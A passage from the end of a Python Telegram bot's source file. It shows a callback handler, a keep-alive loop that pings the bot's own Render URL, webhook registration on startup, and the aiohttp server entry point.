    await c.message.delete()
    await show_my_accounts(c.message, l)
    await c.answer()

# ================= Keep-Alive =================
async def keep_alive():
    await asyncio.sleep(60)
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                await session.get(f"{RENDER_URL}/ping")
                print("Pinged Render to keep alive.")
            except Exception as e:
                print(f"Ping failed: {e}")
            await asyncio.sleep(300)

async def on_startup(app):
    await db.setup()
    await bot.set_webhook(f"{RENDER_URL}/webhook")
    asyncio.create_task(keep_alive())

def main():
    app = web.Application()
    app.router.add_get('/ping', lambda r: web.Response(text='OK'))
    SimpleRequestHandler(dispatcher=dp, bot=bot).register(app, path='/webhook')
    setup_application(app, dp, bot=bot)
    app.on_startup.append(on_startup)
    web.run_app(app, host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))

if __name__ == "__main__":
    dp = Dispatcher()
    dp.include_router(router)
    bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
    main()
